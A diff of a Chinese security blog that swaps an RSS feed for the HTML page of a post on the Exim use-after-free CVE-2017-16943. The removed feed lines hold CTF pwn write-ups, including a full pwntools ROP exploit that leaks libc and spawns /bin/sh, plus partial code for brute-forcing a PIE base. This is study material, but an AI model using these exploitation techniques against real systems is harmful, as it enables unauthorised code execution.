@@ -1,28 +1,311 @@
-<?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"
-  xmlns:atom="http://www.w3.org/2005/Atom"
-  xmlns:content="http://purl.org/rss/1.0/modules/content/">
-  <channel>
-    <title>Hc1m1</title>
-    <link>http://0x48.pw/</link>
-    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>CVE-2017-16943 Exim UAF漏洞分析 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：https://bugs.exim.org/show_bug.cgi?id=2199，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash">
+<meta name="keywords" content="bin,research">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2017-16943 Exim UAF漏洞分析">
+<meta property="og:url" content="http://0x48.pw/2017/12/01/0x3E/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：https://bugs.exim.org/show_bug.cgi?id=2199，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash">
+<meta property="og:updated_time" content="2017-12-01T09:10:09.919Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2017-16943 Exim UAF漏洞分析">
+<meta name="twitter:description" content="感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：https://bugs.exim.org/show_bug.cgi?id=2199，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 17.5px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Python/" style="font-size: 13.75px;">Python</a> <a href="/tags/RE/" style="font-size: 12.5px;">RE</a> <a href="/tags/SQLi/" style="font-size: 11.25px;">SQLi</a> <a href="/tags/Web/" style="font-size: 16.25px;">Web</a> <a href="/tags/bin/" style="font-size: 18.75px;">bin</a> <a href="/tags/network/" style="font-size: 10px;">network</a> <a href="/tags/old-blog/" style="font-size: 10px;">old_blog</a> <a href="/tags/php/" style="font-size: 12.5px;">php</a> <a href="/tags/research/" style="font-size: 15px;">research</a> <a href="/tags/sb/" style="font-size: 10px;">sb</a> <a href="/tags/share/" style="font-size: 10px;">share</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://vidar.club">Vidar-Team</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.vidar.club/doku.php">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://drops.vidar.club/">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://misty.moe/">Misty</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.wupco.cn">Wupco</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.scanfsec.com">scanf</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://repwn.com">Bird</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://pzhxbz.cn">pzhxbz</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://veritas501.space/">veritas</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x3E" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/12/01/0x3E/" class="article-date">
+      <time datetime="2017-12-01T03:22:37.000Z" itemprop="datePublished">2017-12-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
     
-    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
-    <pubDate>Fri, 01 Dec 2017 09:10:09 GMT</pubDate>
-    <generator>http://hexo.io/</generator>
+      <input type="hidden" class="isFancy" />
     
-    <item>
-      <title>CVE-2017-16943 Exim UAF漏洞分析</title>
-      <link>http://0x48.pw/2017/12/01/0x3E/</link>
-      <guid>http://0x48.pw/2017/12/01/0x3E/</guid>
-      <pubDate>Fri, 01 Dec 2017 03:22:37 GMT</pubDate>
-      <description>
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CVE-2017-16943 Exim UAF漏洞分析
+    </h1>
+  
+
+      </header>
       
-        &lt;p&gt;感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：&lt;a href=&quot;https://bugs.exim.org/show_bug.cgi?id=2199&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bugs.exim.org/show_bug.cgi?id=2199&lt;/a&gt;，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash&lt;/p&gt;
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/research/">research</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
-      </description>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-      <content:encoded><![CDATA[<p>感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：<a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">https://bugs.exim.org/show_bug.cgi?id=2199</a>，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash</p>
+          
+        <p>感恩节那天，meh在Bugzilla上提交了一个exim的uaf漏洞：<a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">https://bugs.exim.org/show_bug.cgi?id=2199</a>，这周我对该漏洞进行应急复现，却发现，貌似利用meh提供的PoC并不能成功利用UAF漏洞造成crash</p>
 <a id="more"></a>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先进行漏洞复现</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现环境：ubuntu 16.04 server</p>
@@ -188,138 +471,182 @@
 <li><a href="https://github.com/Exim/exim.git" target="_blank" rel="external">Exim源码</a></li>
 <li><a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">Bugzilla-2199</a></li>
 </ol>
-]]></content:encoded>
+
       
-      <comments>http://0x48.pw/2017/12/01/0x3E/#disqus_thread</comments>
-    </item>
+    </div>
     
-    <item>
-      <title>CTF PWN题之setbuf的利用</title>
-      <link>http://0x48.pw/2017/11/11/0x3D/</link>
-      <guid>http://0x48.pw/2017/11/11/0x3D/</guid>
-      <pubDate>Sat, 11 Nov 2017 04:28:03 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……&lt;/p&gt;
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……</p>
-<a id="more"></a>
-<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn</a></p>
-<p>在拿到这题的时候，看了下是32位的，canary都没开，本以为是很简单的题</p>
-<p>在<code>sub_8048ada</code>函数中发现了一个任意函数调用的漏洞，对于<code>filter</code>输入的数值只检测<code>v3&lt;=2</code>，而v3是int型，所以可以任意调用小于<code>0x804b048</code>的函数，但是参数却不能控制，第一个参数是<code>fopen(&quot;/dev/null&quot;)</code>调用返回的文件流，第二个参数是buf，第三个参数为长度</p>
-<p>初次之外就找不到别的漏洞了，在参数无法控制的情况下，只能利用该bin中的本身函数，没有任何getshell的思路</p>
-<p>然后在大佬的教导下，我第一次注意到了<code>setbuf</code>函数，大部分pwn题都会有这个函数，用来设置IO缓冲区的，第一个参数是文件流，第二个参数表示缓冲区，一般在pwn题中的用法是<code>setbuf(stdin, 0)</code>表示标准输入取消缓冲区。</p>
-<p>仔细观察还会发现，stdin并不是0，而是在stdio库中设置的一个文件流，所以也是作用在stdio库中的函数，比如<code>gets</code>, <code>puts</code>, <code>fread</code>, <code>fwrite</code></p>
-<p>比如，<code>gets</code>函数使用的就是stdin文件流，如果设置了<code>setbuf(stdin, buf)</code>，<code>gets</code>函数则会先从buf中获取输入，自己也可以写个简单的代码测试一下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</div><div class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">10</span>);</div><div class="line">	buf[<span class="number">0</span>] = <span class="string">'1'</span>;</div><div class="line">	<span class="built_in">printf</span>(buf);</div><div class="line">	setbuf(<span class="built_in">stdout</span>, buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"test"</span>);</div><div class="line">	write(<span class="number">1</span>, <span class="string">"\n====\n"</span>,<span class="number">6</span>);</div><div class="line">	write(<span class="number">1</span>, buf, <span class="number">10</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>然后运行一下</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./a.out</span></div><div class="line">1</div><div class="line">====</div><div class="line">test</div></pre></td></tr></table></figure>
-<p>可以从结果看出，printf根本没有输出<code>test</code>，而是把这个字符串输出到buf缓冲区中了，从而修改了buf中的内容。</p>
-<p>因为设置的是stdout的缓冲区，而stdout是stdio库中的文件流，所以write并没有受到影响</p>
-<p>还有一个问题，<code>setbuf</code>并没有设置长度的参数，设置长度的需要使用<code>setvbuf</code>，所以默认情况下setbuf设置的缓冲区长度为默认的4096，这样在该题中就形成了一个攻击链</p>
-<p>控制程序跳转到<code>setbuf</code>函数，简单的讲就是调用<code>setbuf(fd=fopen(&quot;/dev/null&quot;), buf1)</code>，然后在<code>sub_8048742(no_filter)</code>函数中调用了<code>fwrite(fd, 0, buf2, len)</code>，这样就能往buf1中写buf2的数据，而buf是存在栈中的，所以可以造成栈溢出，能栈溢出了，下面就是找ROP链了</p>
-<p>栈溢出构造逻辑：</p>
-<p>add(rop) -&gt; add(buf1) -&gt; buf(buf2) -&gt; add(buf3) -&gt; add(buf4) -&gt; setbuf(fd, buf4) -&gt; post(buf1) -&gt; post(rop) -&gt; 栈溢出，利用ROP链</p>
-<p>下面就是研究怎么构造ROP，我的思路是：</p>
-<p>利用printf泄露libc地址 -&gt; 算出system，字符串<code>/bin/sh</code>地址 -&gt; 构造出第二个system(“/bin/sh”)的ROP链 -&gt; 通过fread写入.bss段 -&gt; 利用ROP把栈修改成.bss段 -&gt; 执行第二个ROP system(“/bin/sh”)</p>
-<p>同样也能利用one_gadget，payload下面会放，这里再讨论一个问题</p>
-<p>我把栈地址修改成<code>0x804b100</code>,执行<code>system(&quot;/bin/sh&quot;)</code>是失败的，然后再和大佬的讨论中发现了几种可能，system需要获取系统的环境变量envp，通过看system的源代码，发现有一个全局指针变量<code>_environ</code>指向栈上的envp，如果这个值被覆盖成了一个无效的地址，system则无法执行。但是在该题中，我的第一个rop并不长，所以并没有覆盖掉envp，之后修改了栈地址，也不存在覆盖envp的情况。</p>
-<p>然后还有第二种情况，system栈地址空间不足，程序的可读可写地址空间是从<code>0x804b000-0x804c000</code>，总长度为0x1000，然后我修改的栈地址为<code>0x804b100</code>，所以system可用的栈空间只有0x100，之后我把栈的地址修改成<code>0x804b700</code>后，就能成功执行<code>system(&quot;/bin/sh&quot;)</code>了</p>
-<p>附上payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = "debug"</span></div><div class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, data)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"contents: "</span>)</div><div class="line">	p.sendline(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(p, n, offset)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"3"</span>)</div><div class="line">	p.readuntil(<span class="string">"ID (0-4): "</span>)</div><div class="line">	p.sendline(str(n))</div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(str(offset))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(p)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"4"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p = process(<span class="string">"./mailer"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">	e = ELF(<span class="string">"./mailer"</span>)</div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line">	gadget1 = <span class="number">0x08048dab</span>   <span class="comment"># pop ebp ; ret</span></div><div class="line">	gadget2 = <span class="number">0x080485f8</span>   <span class="comment"># leave ; ret</span></div><div class="line">	gadget3 = <span class="number">0x08048495</span>   <span class="comment"># pop ebx ; ret</span></div><div class="line">	gadget4 = <span class="number">0x08048daa</span>   <span class="comment"># pop edi ; pop ebp ; ret</span></div><div class="line">	gadget5 = <span class="number">0x08048da9</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">	one_gadget_sh = <span class="number">0x56ff5</span></div><div class="line">	read_buf = <span class="number">0x080486D9</span></div><div class="line">	stdin_bss = <span class="number">0x804B060</span></div><div class="line">	bss_buf = <span class="number">0x804b700</span></div><div class="line">	rop1 = <span class="string">"a"</span>*<span class="number">0xd</span></div><div class="line">	rop1 += p32(e.symbols[<span class="string">"printf"</span>]) + p32(gadget3) + p32(e.got[<span class="string">"printf"</span>]) <span class="comment"># printf(&amp;printf)</span></div><div class="line">	rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(<span class="number">0x100</span>) <span class="comment"># fread(buf, 1, 0x100, stdin)</span></div><div class="line">	rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)</div><div class="line">	add(p, rop1)</div><div class="line">	add(p, <span class="string">"b"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"c"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"d"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"e"</span>*<span class="number">255</span>)</div><div class="line">	post(p, <span class="number">4</span>, <span class="number">-15</span>)</div><div class="line">	post(p, <span class="number">1</span>, <span class="number">0</span>)</div><div class="line">	post(p, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">	quit(p)</div><div class="line">	p.readuntil(<span class="string">":)\n"</span>)</div><div class="line">	printf_got = u32(p.read(<span class="number">4</span>))</div><div class="line">	<span class="comment"># print hex(printf_got)</span></div><div class="line">	system_libc = libc.symbols[<span class="string">"system"</span>]</div><div class="line">	printf_libc = libc.symbols[<span class="string">"printf"</span>]</div><div class="line">	binsh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</div><div class="line">	system_add = printf_got - printf_libc + system_libc</div><div class="line">	binsh_add =  printf_got - printf_libc + binsh_libc</div><div class="line">	one_gadget = printf_got - printf_libc + <span class="number">0x3a838</span></div><div class="line">	<span class="comment">#rop2 = "aaaa" + p32(gadget5) + p32(binsh_add+one_gadget_sh) + "aaaa" + p32(bss_buf) + p32(one_gadget)</span></div><div class="line">	rop2 = <span class="string">"aaaa"</span> + p32(system_add) + p32(binsh_add) + p32(binsh_add)</div><div class="line">	p.sendline(rop2)</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
-]]></content:encoded>
-      
-      <comments>http://0x48.pw/2017/11/11/0x3D/#disqus_thread</comments>
-    </item>
+  </div>
+  
     
-    <item>
-      <title>看雪CTF 第四题club_pwn writeup</title>
-      <link>http://0x48.pw/2017/11/03/0x3C/</link>
-      <guid>http://0x48.pw/2017/11/03/0x3C/</guid>
-      <pubDate>Fri, 03 Nov 2017 03:47:19 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上&lt;/p&gt;
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>前几天做了看雪ctf的一道pwn题，但是工作比较忙，一直没时间写wp，今天有空了，把wp补上</p>
-<a id="more"></a>
-<p>据说这题出题人出题失误，导致题目难度大大下降，预期是house_of_orange的，但是利用unlink就能做了</p>
-<h2 id="获取ELF基地址"><a href="#获取ELF基地址" class="headerlink" title="获取ELF基地址"></a>获取ELF基地址</h2><p>程序中有一个猜随机数的功能，代码大致逻辑如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">*seed = &amp;seed;</div><div class="line">srand(&amp;seed);</div><div class="line">......</div><div class="line">v1 = rand();</div><div class="line">puts(&quot;Please input the number you guess:&quot;);</div><div class="line">printf(&quot;&gt; &quot;);</div><div class="line">if ( v1 == sub_AFA() )</div><div class="line">	result = printf(&quot;G00dj0b!You get a secret: %ld!\n&quot;, *&amp;seed);</div><div class="line">else</div><div class="line">	result = printf(&quot;Wr0ng answer!The number is %d!\n&quot;, v1);</div><div class="line">return result;</div><div class="line"></div><div class="line">.bss:0000000000202148 seed</div></pre></td></tr></table></figure>
-<p>使用seed变量的地址作为伪随机数生成器的种子, 因为这个程序开启了PIE保护，所以实际上每次程序运行，种子都是不一样的, 然后随机生成一个数让你猜，猜对了告诉你种子，猜错了告诉你这个随机数</p>
-<p>如果我们能得到种子，因为ELF基地址和seed地址的偏移值是固定的，所以我们就能算出ELF的基地址了</p>
-<p>然后去翻阅了下random的源码：<a href="https://code.woboq.org/userspace/glibc/stdlib/random.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/random.c.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">207 void __srandom (unsigned int x)</div><div class="line">209 &#123;</div><div class="line">210     __libc_lock_lock (lock);</div><div class="line">211    (void) __srandom_r (x, &amp;unsafe_state);</div><div class="line">212    __libc_lock_unlock (lock);</div><div class="line">213 &#125;</div><div class="line">214</div><div class="line">215 weak_alias (__srandom, srandom)</div><div class="line">216 weak_alias (__srandom, srand)</div></pre></td></tr></table></figure>
-<p>发现，<code>__srandom</code>的参数是无符号整型，长度只有32bit</p>
-<p>虽然开了PIE，但ELF的基地址因为系统页对其的原因，最后12bit固定是0，所以，我们只需要爆破20bit，这是非常容易的，下面是部分payload代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">def get_rand_num():</div><div class="line">    guess_num(123)</div><div class="line">    r.readuntil(&quot;is &quot;)</div><div class="line">    random_num = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return random_num</div><div class="line"></div><div class="line">def get_elf_base(random_num):</div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(&quot;secret:&quot;)</div><div class="line">    elf_base = int(r.readuntil(&quot;!&quot;)[:-1])</div><div class="line">    return elf_base-seed_address</div><div class="line"></div><div class="line">def 